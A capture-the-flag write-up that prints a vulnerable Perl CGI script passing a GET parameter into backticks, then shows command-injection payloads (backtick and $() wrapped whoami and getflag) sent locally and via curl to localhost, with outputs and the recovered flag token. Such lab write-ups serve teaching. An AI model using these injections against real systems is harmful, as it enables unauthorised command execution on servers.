# CTF Report — Level04 Perl Script Exploitation (English, detailed)

---

## Overview

This report documents the exploitation of a Perl CGI script (`level04.pl`) that accepts user input through a GET parameter `x`. The steps below follow the exact procedure you used to retrieve the flag, without altering any commands, inputs, or outputs.

---

## Script Analysis

The content of `level04.pl`:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

**Key points:**

* Accepts a CGI parameter `x`.
* Executes the parameter inside backticks with `echo $y`, allowing **command injection**.
* Prints the command output in the HTTP response.

---

## Exploitation Steps

### 1. Basic command execution via script

```bash
./level04.pl 'x=$(whoami)'
```

Output:

```
Content-type: text/html

level04
```

> The script executes `whoami` via the `x` parameter, confirming command injection works.

---

### 2. Exploiting via HTTP request

```bash
curl 'localhost:4747/level04.pl?x=`whoami`'
```

Output:

```
flag04
```

> Demonstrates that executing `whoami` remotely returns the user `flag04`.

---

### 3. Retrieving the flag

```bash
curl 'localhost:4747/level04.pl?x=`getflag`'
```

Output:

```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

> Successfully executed the `getflag` command through command injection and retrieved the CTF token.

---

## Observed Flag

```
ne2searoevaevoem4ov4ar8ap
```
